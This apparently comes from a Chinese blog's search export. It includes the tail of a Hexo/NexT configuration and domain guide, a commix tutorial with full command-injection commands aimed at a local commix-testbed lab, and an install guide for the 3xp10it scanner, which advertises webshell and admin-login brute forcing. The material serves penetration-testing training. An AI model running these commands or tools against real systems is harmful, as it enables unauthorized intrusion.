light # default scheme is light (light or dark)# Show number of visitors to each article.# You can visit https://leancloud.cn get AppID and AppKey.leancloud_visitors: enable: true app_id: #&lt;app_id&gt; app_key: #&lt;app_key&gt;# Show PV/UV of the website/page with busuanzi.# Get more information on http://ibruce.info/2015/04/04/busuanzi/busuanzi_count: # count values only if the other configs are false enable: false # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; site_pv_footer: # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; page_pv_footer:# Tencent analytics ID# tencent_analytics:# Enable baidu push so that the blog will push the url to baidu automatically which is very helpful for SEObaidu_push: false# Google Calendar# Share your recent schedule to others via calendar page## API Documentation:# https://developers.google.com/google-apps/calendar/v3/reference/events/listcalendar: enable: false calendar_id: &lt;required&gt; api_key: &lt;required&gt; orderBy: startTime offsetMax: 24 offsetMin: 4 timeZone: showDeleted: false singleEvents: true maxResults: 250# Algolia Searchalgolia_search: enable: false hits: per_page: 10 labels: input_placeholder: Search for Posts hits_empty: "We didn't find any results for the search: $&#123;query&#125;" hits_stats: "$&#123;hits&#125; results found in $&#123;time&#125; ms"#! ---------------------------------------------------------------#! DO NOT EDIT THE FOLLOWING SETTINGS#! UNLESS YOU KNOW WHAT YOU ARE DOING#! ---------------------------------------------------------------# Motionuse_motion: true# Fancyboxfancybox: true# Canvas-nestcanvas_nest: false# Script Vendors.# Set a CDN address for the vendor you want to customize.# For example# jquery: https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js# Be aware that you should use the same version as internal ones to avoid potential problems.# Please use the https protocol of CDN files when you enable https on your site.vendors: # Internal path prefix. Please do not edit it. _internal: lib # Internal version: 2.1.3 jquery: # Internal version: 2.1.5 # See: http://fancyapps.com/fancybox/ fancybox: fancybox_css: # Internal version: 1.0.6 # See: https://github.com/ftlabs/fastclick fastclick: # Internal version: 1.9.7 # See: https://github.com/tuupola/jquery_lazyload lazyload: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity: # Internal version: 1.2.1 # See: http://VelocityJS.org velocity_ui: # Internal version: 0.7.9 # See: https://faisalman.github.io/ua-parser-js/ ua_parser: # Internal version: 4.6.2 # See: http://fontawesome.io/ fontawesome: # Internal version: 1 # https://www.algolia.com algolia_instant_js: algolia_instant_css: # Internal version: 1.0.0 # https://github.com/hustcc/canvas-nest.js canvas_nest:# Assetscss: cssjs: jsimages: images# Theme versionversion: 5.1.0 个性化设置按照NexT 使用文档设置一下，其中的内容下面不再赘述。 绑定个人域名1、在source文件夹中新建一个CNAME文件（无后缀名），然后用文本编辑器打开，在首行添加你的网站域名，如http://xxxx.com，注意前面没有http://，也没有www，然后使用hexo g &amp;&amp; hexo d上传部署。2、在域名解析提供商，下面以dnspod为例。（1）先添加一个CNAME，主机记录写@，后面记录值写上你的http://xxxx.github.io（2）再添加一个CNAME，主机记录写www，后面记录值也是http://xxxx.github.io这样别人用www和不用www都能访问你的网站（其实www的方式，会先解析成http://xxxx.github.io，然后根据CNAME再变成http://xxx.com，即中间是经过一次转换的）。上面，我们用的是CNAME别名记录，也有人使用A记录，后面的记录值是写github page里面的ip地址，但有时候IP地址会更改，导致最后解析不正确，所以还是推荐用CNAME别名记录要好些，不建议用IP。3、等十分钟左右，刷新浏览器，用你自己域名访问下试试(参考)]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[commix-系统命令注入自动化测试实例]]></title>
      <url>%2F2017%2F01%2F21%2Fcommix-%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E5%AE%9E%E4%BE%8B%2F</url>
      <content type="text"><![CDATA[引言​ commix是一款很好用的命令注入的工具，前几天看了看国内对其的介绍和使用示例挺少的，所以最近有空就写了这一篇文章来列举几个使用的栗子。 概念​ 命令注入就是部分Web应用程序提供了一些命令执行的操作，那么在Web应用程序底层去调用系统操作命令时，如果没有过滤好用户输入的数据，就很有可能形成系统命令执行漏洞来直接执行操作系统命令。详细讲解参考Command Injection commix简介​ 此处就不详细介绍了如果想要了解可以看这两篇文章： ​ http://www.mottoin.com/91981.html ​ http://www.mottoin.com/91806.html 测试环境搭建​ 在这里你可以使用DVWA或者DWAPP来实战，当然我觉得要尽可能全的包含各种类型的命令注入漏洞才算完美所以我们在此处使用commix提供的一个测试平台commix-testbed。 1.如果你在使用windows平台那么我推荐PHPStudy来搭建环境 安装完成后你只需要在phpstudy的www目录下打开cmd键入： git clone https://github.com/commixproject/commix-testbed.git (当然你要确保你安装了Git) 之后只要启动phpstudy就可以在浏览器中访问了 2.如果你使用的是Linux或者MacOS平台我推荐用xampp来搭建环境 搭建好之后你就可以看到如下界面 环境搭建好后我们来进行渗透测试 示例一：Results-based命令注入攻击我们选择GET方式的Classic regular example ping下127.0.0.1试下 复制url并打开commix开始hack 渗透主机为win后期可以借助empire（不知道empire？？？没关系戳我） 可以使用 commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/classic.php?addr=127.0.0.1&quot; --hostname --current-user --sys-info 含义：显示当前测试主机的主机名，用户名和系统信息 如果渗透主机为Linux则后期可以借助msf(不会msf？？？没关系戳我) 示例二：User-Agent HTTP头注入攻击选择User-Agent HTTP Header中的第一个Classic user-agent-based example http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/user-agent/ua(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 含义：post参数addr=192.168.1.121并指定要使用的进样技术 效果如下： 示例三：Referer HTTP头注入攻击选择Referer HTTP Header中的第一个Classic referer-based example http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/referer/referer(classic).php&quot; --data=&quot;addr=192.168.1.121&quot; --technique=&quot;c&quot; 和上面的差不多不解释了 效果如下： 示例四：Blind 命令注入攻击选择Regular (GET / POST)中的Blind regular example http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1 然后开始使用commix注入： commix -u &quot;http://192.168.1.108/commix-testbed/scenarios/regular/GET/blind.php?addr=127.0.0.1&quot; --technique=&quot;tf&quot; -v 1 效果如下： 执行命令： 彩蛋上面的例子不是很全，有几个使用commix进行命令注入的视频，有兴趣可以下载看下 链接: https://pan.baidu.com/s/1qXMNjZm 密码: 5peb 参考https://github.com/commixproject/commix-testbed https://github.com/commixproject/commix http://www.commixproject.com/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[3xp10it搭建指南]]></title>
      <url>%2F2017%2F01%2F21%2F3xp10it%E6%90%AD%E5%BB%BA%E6%8C%87%E5%8D%97%2F</url>
      <content type="text"><![CDATA[引言​ 突然想到前几天看到Scanners-Box有一款扫描器3xp10it于是就搭建使用了一下，刚觉还不错，就简要记录下我的搭建过程。（bing api key目前已经无法注册） 安装环境kali linux rolling 2016.2 安装过程1.安装git apt-get install git 2.把3xp10it克隆到本合适的位置 1git clone https://github.com/3xp10it/3xp10it.git 3.安装相关依赖,第一次使用工具时需要运行,以后不用再运行 1bash beforeWork.sh 4.python3安装 12345678apt-get install python3或:wget https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tar.xztar xJf Python-3.5.2.tar.xzcd Python-3.5.2./configure --prefix=/opt/python3make &amp;&amp; make installln -s /opt/python3/bin/python3.5 /usr/local/bin/python3 5.pip3安装 1234echo &quot;deb-src http://http.kali.org/kali kali main non-free contrib&quot; &gt;&gt; /etc/apt/sources.listecho &quot;deb-src http://security.kali.org/kali-security kali/updates main contrib non-free&quot; &gt;&gt;/etc/apt/sources.listapt-get updateapt-get install python3-pip 6.mysql 需要mysql，如果mysql密码忘记了可以参考这篇文章《kali-linux-2016-使用指南二》 7.运行主程序,工作时运行,第一次运行时需要先运行上面的beforeWork.sh 1python3 3xp10it.py 8.要新开一个终端运行以便于查看相关输出信息,该工具为web后台 1python3 web.py 效果示例 关于这款工具a)3xp10it是一个自动化渗透测试框架,目前没有做到完全自动化[自动上传漏洞利用框架和自动fuzz框架暂时没有加入] b)支持功能列表 cdn真实ip查找模块 旁站获取[如果在cdn模块中发现有cdn但是没有获取到真实ip则不进行旁站获取] 子站获取 高危漏洞扫描模块 爬虫模块 目标网站脚本类型检测 目录扫描模块 sqli扫描模块 robots/sitemap自动收集 cms识别与cms漏洞扫描模块 自动识别管理员页面并爆破[支持自动识别简单验证码] webshell自动查找与爆破,支持asp,php,aspx,jsp,支持chopper一句话webshell和大马类型webshell 12345a)apache,iis,nginx,lighttpd在phpstudy中测试默认可接收1000个post参数 b)一句话类型webshell根据上面的特点可以正常情况下(单线程)的1000倍速度来爆破,可用大字典爆破,但是不能用多线程, 可能是因为用多线程会太快而让web server觉得每次的参数不止1000个 c)其他类型web server未测试,暂用多线程1倍速爆破,用最常用的webshell较小字典,17659个左右 d)大马类型webshell由于表单名是一定的,所以不能以1000倍速爆破,于是也用和c)中一样的小字典多线程1倍速爆破 资源文件收集 端口扫描模块 whois信息收集 支持人工渗透时记录笔记 123笔记功能需要额外安装phpmyadmin等可以编辑数据库的工具,访问数据库,在targets|xxx_pang|xxx_sub表中有一个note列可用于记录人工渗透时的笔记,查看扫描结果最好也用phpmyadmin来查看数据库的targets表和xxx_pang和xxx_sub表,如果不安装phpmyadmin也可由web.py在web后台中查看扫描结果 c)可选工作模式 模式一:扫描目标和目标的所有旁站模式二:扫描目标和目标的所有子站模式三:扫描目标和目标的所有旁站和所有子站模式四:只扫描目标 123默认使用模式一扫描[在运行3xp10it后可自选],上面四种模式中的[扫描目标]里的目标支持批量导入多个目标和手工录入多个目标.四种工作模式中与旁站和子站相关的由程序自动完成[eg.选择模式三工作时,将自动获取导入的目标的所有旁站和所有子站,并对这些旁站和子站依次遍历上面的各个扫描模块] d)特点 可在中断后重新运行时从断点附近接着上次的过程扫描,不用重新扫描 运行3xp10it后自动从数据库中取出待完成的扫描任务进行扫描 支持正常扫描和优先扫描两个扫描组,如果优先扫描组里有任务则先扫描优先扫描组里的目标,在添加任务时可选择将目标是 正常扫描还是优先扫描 上述支持功能列表中的功能默认全部遍历扫描,如果要使用单个模块可在web界面使用 3xp10it配备一个web后台,web页面可查询当前扫描结果与使用单个模块功能 3xp10it独立于web运行,也即没有目录下的pannel文件夹也可运行 目录下的pannel文件夹是Django为3xp10it写的一些相关界面,web界面使用在下面介绍 支持找到高危漏洞邮件通知[eg.sqli,webshell爆破成功等] web后台相当于3xp10it的部分界面+分割的模块化工具+exp10it中没有的功能的附加工具的集合 web后台由Django==1.10.3开发 web后台中支持工具列表 targets:查看扫描目标,新增/删除扫描目标 获取旁[子]站:获取旁站或子站模块 xcdn:尝试识别cdn背后的真实ip 高危漏扫:高危漏洞扫描模块 sqli:sql注入模块 扫目录:目录扫描模块 cms漏扫:cms漏洞扫描模块 webshell爆破:webshell爆破模块 管理员登录爆破:管理员登录爆破模块 waf爆破:waf自动爆破模块[3xp10it中没有这个功能] dbquery:数据库语句执行接口 扫描结果:查看当前扫描结果 详细1234567891011121314151617181920212223242526272829303132333435363738394041421.3xp10it需要用到bingapi,需要先申请好bingapi2.上面的web.py不一定要运行,核心功能在3xp10it.py文件中3.如果要后台功能需运行python3 web.py4.如果要使用web.py,重新开机后需要重新运行web.py5.运行web.py常见错误:端口被占用.解决方法:a)netstat -ntlp | grep 8000b)在a)中找到pid后kill -9 pidc)重新运行python3 web.py6.3xp10it中调用的是关键模块exp10it中的exp10itScanner,exp10it模块由pip3 install exp10it安装,安装路径一般如下:/usr/local/lib/python3.5/dist-packages7.文件分布结构如下:当前目录.├── 3xp10it.py├── pannel│ ├── ghostdriver.log│ ├── manage.py│ ├── models.py[web后台没有用django的模型]│ ├── pages[web页面的html文件,相当于django的template]│ └── pannel[django相关文件]│ ├── __init__.py│ ├── settings.py│ ├── urls.py[django配置的访问与响应规则]│ ├── views.py[django配置的关键函数]│ └── wsgi.py├── readme.md├── uninstall.py└── web.py/usr/local/lib/python3.5/dist-packages路径下相关文件├── cms_identify[cms识别模块相关文件]├── cms_scan[cms漏洞扫描模块相关文件]├── config.ini[配置文件]├── dicts[字典文件]├── dirsearch[目录扫描模块相关文件]├── exp10it.py[关键模块文件]├── exps[exp模块相关文件]├── log[日志文件夹]├── tools[web后台中的各个工具] FAQ12345678910111213141516Q0:config.ini 这个文件怎么没有找到?A0:config.ini在python3 3xp10it.py初次运行后会自动生成,用于设置bing API key,发邮件的帐号,数据库连接配置,扫描模式 等信息,一般会在/usr/local/lib/python3.5/dist-packages/config.ini这里,与python3的安装路径有关Q1:单个模块怎么使用?A1:单个模块执行有2种方法: 1)web后台 2)cd /usr/local/lib/python3.5/dist-packages/tools &amp;&amp; ls -alQ2:为什么需要连接google才能用?A2:要保证能直接ping通google证明可以绕过GFW,有些domain不连vpn会无法访问,这样的domain在正常情况下被GFW拦截时会影响 代码获取真实ip的效果,代码中强制要求连接vpnQ3:bing api key怎么注册?网上的教程都是错的?A3:好像是bing暂停注册了,这样的话只能向以前注册过的人要,如果bing一直这样,将考虑在代码中修改这个接口,但3个月内暂 时不修改 参考https://github.com/3xp10it/3xp10it http://zeroyu.xyz/2017/01/05/kali-linux-2016-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97%E4%BA%8C/]]></content>
    </entry>

    
  
  
    
  
</search>
